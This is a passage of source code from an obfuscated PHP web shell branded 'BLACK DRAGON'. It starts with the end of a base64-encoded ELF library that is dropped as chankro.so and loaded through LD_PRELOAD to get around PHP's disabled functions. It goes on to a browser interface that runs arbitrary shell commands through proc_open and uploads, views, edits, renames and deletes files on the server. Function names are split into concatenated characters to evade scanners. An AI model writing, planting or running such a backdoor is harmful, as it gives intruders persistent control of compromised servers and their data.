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';
        $cmdd = $_POST['cmd_input'];
        $meterpreter = $en($cmdd." > test.txt");
        $viewCommandResult = '<hr><p>Result: <font color="black">base64 : ' . $meterpreter .'</br>Please Refresh and Check File test.txt, this output command<br>test.txt created = VULN<br>test.txt not created = NOT VULN<br>example access: domain.com/yourpath/path/test.txt<br>Powered By BLACK DRAGON</font><br><br></textarea>';        
        $a($full . '/chankro.so', $base($hook));
        $a($full . '/acpid.socket', $base($meterpreter));
        $p('CHANKRO=' . $full . '/acpid.socket');
        $p('LD_PRELOAD=' . $full . '/chankro.so');
        $m('a','a','a','a');
    }elseif (isset($_POST['delete_file'])) {
        bdLogActivity("DELETE: " . $_POST['delete_file']);
        $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
        if (file_exists($fileToDelete)) {
            if (is_dir($fileToDelete)) {
                if (deleteDirectory($fileToDelete)) {
                    echo '<hr>Folder deleted successfully!';
                } else {
                    echo '<hr>Error: Failed to delete folder!';
                }
            } else {
                if ($unl($fileToDelete)) {
                    echo '<hr>File deleted successfully!';
                } else {
                    echo '<hr>Error: Failed to delete file!';
                }
            }
        } else {
            echo '<hr>Error: File or directory not found!';
        }
    } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
        bdLogActivity("RENAME: " . $_POST['old_name'] . " -> " . $_POST['new_name']);
        $oldName = $currentDirectory . '/' . $_POST['old_name'];
        $newName = $currentDirectory . '/' . $_POST['new_name'];
        if (file_exists($oldName)) {
            if (rename($oldName, $newName)) {
                echo '<hr>Item renamed successfully!';
            } else {
                echo '<hr>Error: Failed to rename item!';
            }
        } else {
            echo '<hr>Error: Item not found!';
        }
    }elseif (isset($_POST['cmd_biasa'])) {
        bdLogActivity("COMMAND BIASA: " . substr($_POST['cmd_biasa'], 0, 200));
            $pp = "p"."r"."o"."c"."_"."o"."p"."e"."n";
            $pc = "f"."c"."l"."o"."s"."e";
            $ppc = "p"."r"."o"."c"."_"."c"."l"."o"."s"."e";
            $stg = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
            $command = $_POST['cmd_biasa'];
            $descriptorspec = [
                0 => ['pipe', 'r'],
                1 => ['pipe', 'w'],
                2 => ['pipe', 'w']
            ];
            $process = $pp($command, $descriptorspec, $pipes);
            if (is_resource($process)) {
                $output = $stg($pipes[1]);
                $errors = $stg($pipes[2]);
                $pc($pipes[1]);
                $pc($pipes[2]);
                $ppc($process);
                if (!empty($errors)) {
                    $viewCommandResult = '<hr><p>Error: </p><textarea class="result-box">' . $htm($errors) . '</textarea>';
                } else {
                    $viewCommandResult = '<hr><p>Result: </p><textarea class="result-box">' . $htm($output) . '</textarea>';
                }
            } else {
                $viewCommandResult = 'Result:</p><textarea class="result-box">Error: Failed to execute command! </textarea>';
            }
    } elseif (isset($_POST['view_file'])) {
        bdLogActivity("VIEW FILE: " . $_POST['view_file']);
        $fileToView = $currentDirectory . '/' . $_POST['view_file'];
        if (file_exists($fileToView)) {
            $fileContent = $fgc($fileToView);
            $viewCommandResult = '<hr><p>Result: ' . $_POST['view_file'] . '</p>
            <form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
            <textarea name="content" class="result-box">' . $htm($fileContent) . '</textarea><td>
            <input type="hidden" name="edit_file" value="' . $_POST['view_file'] . '">
            <input type="submit" value=" Save "></form></td>';
        } else {
            $viewCommandResult = '<hr><p>Error: File not found!</p>';
        }
    }  elseif (isset($_POST['edit_file'])) {
        bdLogActivity("EDIT FILE: " . $_POST['edit_file']);
        $ef = $currentDirectory . '/' . $_POST['edit_file'];
        $newContent = $_POST['content'];
        if ($fpc($ef, $newContent) !== false) {
            echo '<hr>File Edited successfully! ' . $_POST['edit_file'].'<hr>';
        } else {
            echo '<hr>Error: Failed Edit File! ' . $_POST['edit_file'].'<hr>';
        }
    }
}

echo '<hr>DIR: ';
$directories = $expl(DIRECTORY_SEPARATOR, $currentDirectory);
$currentPath = '';
foreach ($directories as $index => $dir) {
    $currentPath .= DIRECTORY_SEPARATOR . $dir;
    if ($index == 0) {
        echo '/<a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
    } else {
        echo '/<a href="?d='. x($currentPath) . '">' . $dir . '</a>';
    }
}
echo '<a href="?d=' . x($scriptDirectory) . '"> / <span style="color: green;">[ GO Home ]</span></a>';
echo '<br>';
echo '<hr><form method="post" enctype="multipart/form-data">';
echo '<hr>';
echo '<input type="file" name="fileToUpload" id="fileToUpload" placeholder="pilih file:">';
echo '<input type="submit" value="Upload File" name="submit">';
echo '</form><hr>';
echo '<table border="5"><tbody>
<tr>
<td>
<center>Command BYPASS<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
<input type="text" name="cmd_input" placeholder="Enter command"><input type="submit" value="Run Command"></form></center></td>
<td><center>Command BIASA<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
<input type="text" name="cmd_biasa" placeholder="Enter command"><input type="submit" value="Run Command"></form><center></td>
<td><center>Create Folder<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
<input type="text" name="folder_name" placeholder="Folder Name"><input type="submit" value="Create Folder"></form><center></td>
<td><center>Create File<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">
<input type="text" name="file_name" placeholder="File Name"><input type="submit" value="Create File"></form></td></tr>
</tbody></table>';
echo $viewCommandResult;
echo '<table border=1>';
echo '<br><tr><th><center>Item Name</th><th><center>Size</th><th><center>Date</th><th>Permissions</th><th><center>View</th><th><center>Delete</th><th><center>Rename</th></tr></center></center></center>';
foreach ($scd($currentDirectory) as $v) {
    $u = $ril($v);
    $s = $st($u);
    $itemLink = $isdir($v) ? '?d=' . x($currentDirectory . '/' . $v) : '?'.('d='.x($currentDirectory).'&f='.x($v));
    $permission = substr(sprintf('%o', fileperms($u)), -4);
    $writable = $isw($u);
    echo '<tr>
            <td class="item-name"><a href="'.$itemLink.'">'.$v.'</a></td>
            <td class="size">'.filesize($u).'</td>
            <td class="date" style="text-align: center;">'.date('Y-m-d H:i:s', filemtime($u)).'</td>
            <td class="permission '.($writable ? 'writable' : 'not-writable').'">'.$permission.'</td>
            <td><center><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="view_file" value="'.$htm($v).'"><input type="submit" value=" View "></form></center></td>
            <td><center><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="delete_file" value="'.$htm($v).'"><input type="submit" value="Delete"></form></center></td>
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="old_name" value="'.$htm($v).'"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
        </tr>';
}
echo '</table>';

function deleteDirectory($dir) {
   $unl = "u"."n"."l"."i"."n"."k";
    if (!file_exists($dir)) {
        return true;
    }
    if (!is_dir($dir)) {
        return $unl($dir);
    }
    $scd = "s"."c"."a"."n"."d"."i"."r";
    foreach ($scd($dir) as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }
        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
            return false;
        }
    }
    return rmdir($dir);
}
